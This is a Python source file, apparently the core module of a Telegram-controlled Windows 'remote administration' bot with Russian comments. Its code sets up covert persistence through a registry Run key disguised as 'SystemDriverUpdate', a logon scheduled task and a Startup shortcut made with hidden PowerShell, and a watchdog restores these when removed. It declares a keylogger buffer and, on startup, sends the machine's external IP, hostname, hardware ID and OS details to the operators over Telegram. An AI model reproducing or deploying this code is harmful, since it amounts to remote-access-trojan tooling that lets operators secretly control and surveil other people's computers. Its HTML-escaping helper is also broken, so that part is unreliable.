# bot_core.py
"""
Ядро системы Telegram-бота для удаленного администрирования
Содержит инициализацию, конфигурацию, утилиты и базовые функции
"""

import telebot
import os
import sys
import time
import subprocess
import pyautogui
import psutil
import winreg as reg
from telebot import types
import ctypes
import zipfile
import urllib.request
import socket
import keyboard
import shutil
import logging
import logging.handlers
import tempfile
import traceback
from datetime import datetime

# Импорт модулей проекта
from config import *
from database import db, ROLE_SUPER_ADMIN, ROLE_ADMIN
from hwid_generator import generate_hwid, get_device_name as get_hwid_device_name

# Настройка расширенного логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.handlers.RotatingFileHandler(
            LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'
        ),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Глобальный обработчик исключений
def global_exception_handler(exc_type, exc_value, exc_traceback):
    """Глобальный обработчик исключений для предотвращения падения бота"""
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    
    logger.critical("Неперехваченное исключение:", exc_info=(exc_type, exc_value, exc_traceback))

sys.excepthook = global_exception_handler

# Глобальные переменные
LOCK_WINDOW = None
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemDriverUpdate"
REG_NAME_KEY = "DeviceFriendlyName"
KEYLOG_BUFFER = []
MAX_BUFFER_SIZE = 50000

# HWID текущего устройства
CURRENT_HWID = generate_hwid()
CURRENT_DEVICE_NAME = get_hwid_device_name()

# Сессии администраторов (в памяти для быстрого доступа)
admin_sessions = {}  # {admin_id: {'device_id': device_id, 'device_hwid': hwid, 'session_id': session_id}}

# Глобальный экземпляр бота
bot = None

def init_bot(token=None):
    """Инициализация бота (совместимость с main_bot.py)"""
    # Параметр token игнорируется, используется BOT_TOKEN из config
    return init_bot_with_retry()

def init_bot_with_retry():
    """Инициализация бота с повторными попытками при ошибках сети"""
    global bot
    
    # Если бот уже инициализирован, возвращаем существующий экземпляр
    if bot is not None:
        logger.info("Бот уже инициализирован, возвращаем существующий экземпляр")
        return bot
    
    MAX_RETRY_ATTEMPTS = 3
    RETRY_DELAY = 5
    
    for attempt in range(MAX_RETRY_ATTEMPTS):
        try:
            bot = telebot.TeleBot(BOT_TOKEN)
            logger.info(f"Бот инициализирован успешно (попытка {attempt + 1})")
            return bot
        except Exception as e:
            logger.error(f"Ошибка инициализации бота (попытка {attempt + 1}): {e}")
            if attempt < MAX_RETRY_ATTEMPTS - 1:
                logger.info(f"Повторная попытка через {RETRY_DELAY} секунд...")
                time.sleep(RETRY_DELAY)
            else:
                logger.critical("Не удалось инициализировать бота после всех попыток")
                raise
    
    return None

def get_bot():
    """Получение экземпляра бота (инициализация при первом вызове)"""
    global bot
    if bot is None:
        try:
            bot = init_bot_with_retry()
            if not bot:
                sys.exit(1)
        except Exception as e:
            logger.critical(f"Критическая ошибка инициализации бота: {e}")
            sys.exit(1)
    return bot

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def escape_html(text):
    """Экранирование HTML-символов"""
    return str(text).replace("&", "&").replace("<", "<").replace(">", ">")

def is_admin(user_id):
    """Проверка, является ли пользователь администратором"""
    admin = db.get_admin(user_id)
    return admin is not None

def is_super_admin(user_id):
    """Проверка, является ли пользователь супер-администратором"""
    return db.is_super_admin(user_id)

def get_admin_role(user_id):
    """Получение роли администратора"""
    admin = db.get_admin(user_id)
    return admin.get('role') if admin else None

def check_permission(user_id, required_role=ROLE_ADMIN):
    """Проверка прав доступа"""
    if required_role == ROLE_SUPER_ADMIN:
        return is_super_admin(user_id)
    
    admin = db.get_admin(user_id)
    if not admin:
        return False
    
    role = admin.get('role')
    if role == ROLE_SUPER_ADMIN:
        return True
    elif role == ROLE_ADMIN and required_role == ROLE_ADMIN:
        return True
    
    return False

# --- СИСТЕМА ПОДТВЕРЖДЕНИЯ ОПАСНЫХ ДЕЙСТВИЙ ---

# Словарь для хранения состояний пользователей
# Формат: {user_id: {'state': 'waiting_confirmation', 'command': 'lock', 'data': {...}}}
_user_states = {}

def set_user_state(user_id, state, command=None, data=None, confirmation_step=None):
    """Установка состояния пользователя"""
    _user_states[user_id] = {
        'state': state,
        'command': command,
        'data': data or {},
        'timestamp': time.time(),
        'confirmation_step': confirmation_step  # Для двойного подтверждения: 'first' или 'second'
    }
    logger.debug(f"Установлено состояние для пользователя {user_id}: {state}, команда: {command}, шаг: {confirmation_step}")

def get_user_state(user_id):
    """Получение состояния пользователя"""
    return _user_states.get(user_id)

def clear_user_state(user_id):
    """Очистка состояния пользователя"""
    if user_id in _user_states:
        del _user_states[user_id]
        logger.debug(f"Очищено состояние для пользователя {user_id}")

def is_waiting_confirmation(user_id):
    """Проверка, ожидает ли пользователь подтверждения"""
    state = get_user_state(user_id)
    return state and state.get('state') == 'waiting_confirmation'

def start_confirmation_flow(user_id, command, data=None):
    """Начало потока подтверждения для опасной команды"""
    set_user_state(user_id, 'waiting_confirmation', command, data)
    return True

def start_double_confirmation_flow(user_id, command, data=None):
    """Начало потока двойного подтверждения для команды uninstall"""
    set_user_state(user_id, 'waiting_confirmation', command, data, confirmation_step='first')
    return True

def process_confirmation(user_id, user_input):
    """Обработка ввода пользователя для подтверждения"""
    state = get_user_state(user_id)
    if not state or state.get('state') != 'waiting_confirmation':
        return None, "Нет ожидающего подтверждения"
    
    command = state.get('command')
    data = state.get('data', {})
    confirmation_step = state.get('confirmation_step')
    
    # Проверяем ввод пользователя
    user_input_lower = user_input.strip().lower()
    
    # Обработка отмены (работает на любом шаге)
    if user_input_lower == 'cancel':
        clear_user_state(user_id)
        return False, command, data
    
    # Обработка двойного подтверждения для команды uninstall
    if command == 'uninstall':
        if confirmation_step == 'first':
            # Первый шаг: ожидаем слово "confirm"
            if user_input_lower == 'confirm':
                # Переходим ко второму шагу
                set_user_state(user_id, 'waiting_confirmation', command, data, confirmation_step='second')
                return 'next_step', command, data
            else:
                # Неверный ввод для первого шага
                return None, command, data
        elif confirmation_step == 'second':
            # Второй шаг: ожидаем числовой код "12345"
            if user_input_lower == '12345':
                # Подтверждение получено
                clear_user_state(user_id)
                return True, command, data
            else:
                # Неверный код
                return None, command, data
        else:
            # Если шаг не указан, начинаем с первого
            set_user_state(user_id, 'waiting_confirmation', command, data, confirmation_step='first')
            return 'next_step', command, data
    
    # Обычное подтверждение для других команд
    if user_input_lower == 'config':
        # Подтверждение получено
        clear_user_state(user_id)
        return True, command, data
    else:
        # Неверный ввод
        return None, command, data

def get_confirmation_message(command, data=None, confirmation_step=None):
    """Получение сообщения для подтверждения действия"""
    messages = {
        'lock': "🔒 Блокировка компьютера",
        'poweroff': "⏻ Выключение компьютера",
        'reboot': "🔄 Перезагрузка компьютера",
        'rm': "🗑️ Удаление файла",
        'message': "📨 Отправка сообщения на устройство",
        'uninstall': "🗑️ ПОЛНОЕ УДАЛЕНИЕ БОТА С УСТРОЙСТВА"
    }
    
    base_message = messages.get(command, "⚠️ Опасное действие")
    
    if command == 'rm' and data.get('filepath'):
        base_message += f": {data['filepath']}"
    elif command == 'message' and data.get('text'):
        text_preview = data['text'][:50] + ("..." if len(data['text']) > 50 else "")
        base_message += f": {text_preview}"
    elif command == 'uninstall':
        if confirmation_step == 'first':
            base_message += " (ШАГ 1/2)"
        elif confirmation_step == 'second':
            base_message += " (ШАГ 2/2)"
    
    return base_message

def get_confirmation_prompt(command=None, confirmation_step=None):
    """Получение текста запроса подтверждения"""
    if command == 'uninstall':
        if confirmation_step == 'first':
            return "⚠️ Требуется ПЕРВОЕ подтверждение. Отправьте слово `confirm` для продолжения или `cancel` для отмены."
        elif confirmation_step == 'second':
            return "⚠️ Требуется ВТОРОЕ подтверждение. Отправьте числовой код `12345` для выполнения удаления или `cancel` для отмены."
        else:
            return "⚠️ Требуется двойное подтверждение для удаления бота."
    
    return "⚠️ Требуется подтверждение. Отправьте слово `config` для выполнения или `cancel` для отмены."

def get_confirmation_full_message(command, data=None, confirmation_step=None):
    """Получение полного сообщения для подтверждения"""
    action_desc = get_confirmation_message(command, data, confirmation_step)
    prompt = get_confirmation_prompt(command, confirmation_step)
    return f"{action_desc}\n\n{prompt}"

def get_current_device_name():
    """Получение имени текущего устройства"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_READ)
        try:
            name, _ = reg.QueryValueEx(key, REG_NAME_KEY)
            reg.CloseKey(key)
            return str(name)
        except FileNotFoundError:
            reg.CloseKey(key)
    except Exception as e:
        logger.error(f"Ошибка чтения имени устройства из реестра: {e}")
    
    return CURRENT_DEVICE_NAME

def set_device_name_reg(new_name):
    """Установка имени устройства в реестре"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME_KEY, 0, reg.REG_SZ, str(new_name))
        reg.CloseKey(key)
        logger.info(f"Имя устройства обновлено в реестре: {new_name}")
        return True
    except Exception as e:
        logger.error(f"Ошибка записи имени устройства в реестр: {e}")
        return False

def add_to_startup(file_path=None):
    """Добавление в автозагрузку"""
    if file_path is None:
        file_path = sys.executable
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
        logger.info(f"Добавлено в автозагрузку: {file_path}")
        return True
    except Exception as e:
        logger.error(f"Ошибка добавления в автозагрузку: {e}")
        return False

def remove_from_startup():
    """Удаление из автозагрузки"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        try:
            reg.DeleteValue(key, REG_NAME)
        except FileNotFoundError:
            pass
        reg.CloseKey(key)
        logger.info("Удалено из автозагрузки")
        return True
    except Exception as e:
        logger.error(f"Ошибка удаления из автозагрузки: {e}")
        return False

def add_to_startup_extended(file_path=None):
    """Расширенное добавление в автозагрузку (тройная система)"""
    if file_path is None:
        file_path = sys.executable
    
    success_count = 0
    methods = []
    
    # 1. Реестр Windows (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    try:
        import winreg as reg
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, run_key, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, "MainBot", 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
        success_count += 1
        methods.append("реестр")
        logger.info(f"Добавлено в автозагрузку через реестр: {file_path}")
    except Exception as e:
        logger.error(f"Ошибка добавления в реестр автозагрузки: {e}")
    
    # 2. Планировщик задач
    try:
        task_name = "MainBotAutoStart"
        # Создаем команду для создания задачи
        cmd = f'schtasks /create /tn "{task_name}" /tr "{file_path}" /sc onlogon /ru {os.environ.get("USERNAME", "SYSTEM")} /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            success_count += 1
            methods.append("планировщик задач")
            logger.info(f"Создана задача в планировщике: {task_name}")
        else:
            logger.error(f"Ошибка создания задачи в планировщике: {result.stderr}")
    except Exception as e:
        logger.error(f"Ошибка работы с планировщиком задач: {e}")
    
    # 3. Папка Startup (ярлык)
    try:
        startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup_folder):
            shortcut_path = os.path.join(startup_folder, "MainBot.lnk")
            # Создаем ярлык с помощью PowerShell
            ps_script = f"""
            $WshShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
            $Shortcut.TargetPath = "{file_path}"
            $Shortcut.WorkingDirectory = "{os.path.dirname(file_path)}"
            $Shortcut.Save()
            """
            result = subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_script],
                                  capture_output=True, text=True,
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            if result.returncode == 0:
                success_count += 1
                methods.append("папка Startup")
                logger.info(f"Создан ярлык в папке Startup: {shortcut_path}")
            else:
                logger.error(f"Ошибка создания ярлыка: {result.stderr}")
    except Exception as e:
        logger.error(f"Ошибка создания ярлыка в папке Startup: {e}")
    
    logger.info(f"Расширенный автозапуск: успешно применено {success_count}/3 методов: {', '.join(methods)}")
    return success_count >= 2  # Считаем успешным, если хотя бы 2 метода сработали

def check_autostart_exists(file_path=None):
    """Проверка наличия автозапуска в системе"""
    if file_path is None:
        file_path = sys.executable
    
    exists_count = 0
    methods = []
    
    # 1. Проверка реестра
    try:
        import winreg as reg
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, run_key, 0, reg.KEY_READ)
        try:
            value, _ = reg.QueryValueEx(key, "MainBot")
            if value == file_path:
                exists_count += 1
                methods.append("реестр")
        except FileNotFoundError:
            pass
        reg.CloseKey(key)
    except Exception as e:
        logger.error(f"Ошибка проверки реестра автозагрузки: {e}")
    
    # 2. Проверка планировщика задач
    try:
        task_name = "MainBotAutoStart"
        cmd = f'schtasks /query /tn "{task_name}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            exists_count += 1
            methods.append("планировщик задач")
    except Exception as e:
        logger.error(f"Ошибка проверки планировщика задач: {e}")
    
    # 3. Проверка папки Startup
    try:
        startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_folder, "MainBot.lnk")
        if os.path.exists(shortcut_path):
            exists_count += 1
            methods.append("папка Startup")
    except Exception as e:
        logger.error(f"Ошибка проверки папки Startup: {e}")
    
    logger.info(f"Проверка автозапуска: найдено {exists_count}/3 методов: {', '.join(methods)}")
    return exists_count

def ensure_autostart(file_path=None):
    """Проверка и восстановление автозапуска при необходимости"""
    if file_path is None:
        file_path = sys.executable
    
    exists_count = check_autostart_exists(file_path)
    
    # Если меньше 2 методов работают, восстанавливаем
    if exists_count < 2:
        logger.warning(f"Автозапуск недостаточно надежен ({exists_count}/3 методов). Восстанавливаю...")
        return add_to_startup_extended(file_path)
    else:
        logger.info(f"Автозапуск надежен ({exists_count}/3 методов)")
        return True

# --- РЕГИСТРАЦИЯ УСТРОЙСТВА ---

def register_device():
    """Регистрация текущего устройства в базе данных"""
    try:
        # Получаем IP-адрес
        ip_address = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except Exception as e:
            logger.warning(f"Не удалось получить IP-адрес: {e}")
        
        # Добавляем устройство в базу данных
        device_name = get_current_device_name()
        if not db.get_device(CURRENT_HWID):
            db.add_device(CURRENT_HWID, device_name, ip_address)
            logger.info(f"Устройство зарегистрировано: {device_name} (HWID: {CURRENT_HWID})")
        
        # Обновляем время последней активности
        db.update_device_last_online(CURRENT_HWID)
        
        return True
    except Exception as e:
        logger.error(f"Ошибка регистрации устройства: {e}")
        return False

# --- УПРАВЛЕНИЕ СЕССИЯМИ ---

def get_admin_session(admin_id):
    """Получение активной сессии администратора"""
    # Сначала проверяем кэш в памяти
    if admin_id in admin_sessions:
        session_data = admin_sessions[admin_id]
        # Проверяем, что сессия все еще активна в базе данных
        session = db.get_active_session(admin_id)
        if session and session.get('id') == session_data.get('session_id'):
            return session_data
    
    # Если нет в кэше, получаем из базы данных
    session = db.get_active_session(admin_id)
    if session:
        device_id = session.get('device_id')
        device = db.get_device_by_id(device_id) if device_id else None
        session_data = {
            'device_id': device_id,
            'device_hwid': device.get('hwid') if device else None,
            'session_id': session.get('id')
        }
        admin_sessions[admin_id] = session_data
        return session_data
    
    return None

def set_admin_session(admin_id, device_hwid=None):
    """Установка активной сессии для администратора"""
    try:
        # Завершаем предыдущую сессию
        old_session = db.get_active_session(admin_id)
        if old_session:
            db.end_session(old_session.get('id'))
        
        # Получаем ID устройства по HWID
        device_id = None
        if device_hwid:
            device = db.get_device(device_hwid)
            if device:
                device_id = device.get('id')
        
        # Создаем новую сессию
        session_id = db.create_session(admin_id, device_id)
        
        # Обновляем кэш
        admin_sessions[admin_id] = {
            'device_id': device_id,
            'device_hwid': device_hwid,
            'session_id': session_id
        }
        
        logger.info(f"Сессия установлена для admin_id={admin_id}, device_hwid={device_hwid}")
        return True
    except Exception as e:
        logger.error(f"Ошибка установки сессии: {e}")
        return False

def get_target_device_hwid(admin_id):
    """Получение HWID целевого устройства для администратора"""
    session = get_admin_session(admin_id)
    if session and session.get('device_hwid'):
        return session.get('device_hwid')
    return CURRENT_HWID  # По умолчанию текущее устройство

# --- ДЕКОРАТОР ДЛЯ ОБРАБОТКИ КОМАНД ---

def command_handler(func):
    """Декоратор для обработчиков команд с централизованной обработкой ошибок"""
    def wrapper(message):
        try:
            user_id = message.from_user.id
            
            # Проверка прав доступа - если не админ, просто игнорируем
            if not is_admin(user_id):
                logger.warning(f"Попытка несанкционированного доступа от user_id={user_id} - игнорируем")
                return  # Не отвечаем вообще
            
            # Логирование команды
            logger.info(f"Команда {func.__name__} от user_id={user_id}")
            
            # Выполнение команды
            return func(message)
            
        except Exception as e:
            logger.error(f"Ошибка в команде {func.__name__}: {e}\n{traceback.format_exc()}")
            get_bot().reply_to(message, f"⚠️ Ошибка выполнения команды: {str(e)}")
    
    return wrapper

# --- ИНИЦИАЛИЗАЦИЯ СИСТЕМЫ ---

def init_system():
    """Инициализация всей системы"""
    logger.info("=== Инициализация системы мульти-администраторов ===")
    logger.info(f"Версия: 16.0")
    logger.info(f"Текущее устройство: {CURRENT_DEVICE_NAME}")
    logger.info(f"HWID: {CURRENT_HWID}")
    
    # Регистрация устройства
    register_device()
    
    # Обеспечение надежного автозапуска
    ensure_autostart()
    
    # Добавление SuperAdmin при первом запуске
    if not db.get_admin(SUPER_ADMIN_ID):
        db.add_admin(SUPER_ADMIN_ID, "SuperAdmin", ROLE_SUPER_ADMIN)
        logger.info(f"SuperAdmin добавлен: {SUPER_ADMIN_ID}")
    
    logger.info("Система инициализирована и готова к работе")
    return True

def send_welcome_ping(bot_instance=None):
    """
    Отправка приветственного сообщения всем SuperAdmin при запуске бота.
    Сообщает о запуске устройства и его статусе.
    """
    try:
        if bot_instance is None:
            from bot_core import get_bot
            bot_instance = get_bot()
        
        # Получаем всех SuperAdmin
        super_admins = []
        all_admins = db.get_all_admins()
        for admin in all_admins:
            if admin.get('role') == ROLE_SUPER_ADMIN:
                super_admins.append(admin)
        
        if not super_admins:
            logger.warning("Не найдено SuperAdmin для отправки приветственного ping")
            return False
        
        # Получаем информацию о текущем устройстве
        from bot_core import CURRENT_DEVICE_NAME, CURRENT_HWID
        import platform
        import socket
        import datetime
        
        # Получаем IP адрес
        ip_address = "Не определен"
        try:
            # Попробуем получить внешний IP
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                ip_address = response.text
            else:
                # Fallback на локальный IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
                s.close()
        except:
            try:
                # Fallback на локальный IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
                s.close()
            except:
                ip_address = "Не определен"
        
        # Собираем системную информацию
        system_info = {
            'device_name': CURRENT_DEVICE_NAME,
            'hwid': CURRENT_HWID,
            'os': platform.system() + " " + platform.release(),
            'architecture': platform.architecture()[0],
            'python_version': platform.python_version(),
            'hostname': socket.gethostname(),
            'ip_address': ip_address,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'autostart_status': "✅ Надежный (тройная система)" if check_autostart_exists() else "⚠️ Требуется настройка"
        }
        
        # Формируем сообщение в формате, который хочет пользователь
        message = f"""
🟢 ПК <b>{system_info['device_name']}</b> в сети.
📡 <b>IP:</b> <code>{system_info['ip_address']}</code>
🆔 <b>HWID:</b> <code>{system_info['hwid']}</code>
💻 <b>Система:</b> {system_info['os']} ({system_info['architecture']})
🏠 <b>Имя хоста:</b> {system_info['hostname']}
⏰ <b>Время запуска:</b> {system_info['timestamp']}
🔐 <b>Автозапуск:</b> {system_info['autostart_status']}

✅ <b>Статус:</b> Бот успешно запущен и ожидает команд.
📊 <b>Доступные команды:</b> /panel, /pc_list, /info, /screen, /procs

<i>Это автоматическое сообщение при запуске устройства.</i>
"""
        
        # Отправляем сообщение всем SuperAdmin
        success_count = 0
        for admin in super_admins:
            try:
                admin_id = admin.get('telegram_id')
                if admin_id:
                    bot_instance.send_message(admin_id, message, parse_mode='HTML')
                    success_count += 1
                    logger.info(f"Приветственный ping отправлен SuperAdmin: {admin_id}")
            except Exception as e:
                logger.error(f"Ошибка отправки приветственного ping администратору {admin.get('telegram_id')}: {e}")
        
        logger.info(f"Приветственные ping отправлены {success_count}/{len(super_admins)} SuperAdmin")
        return success_count > 0
        
    except Exception as e:
        logger.error(f"Ошибка отправки приветственного ping: {e}")
        return False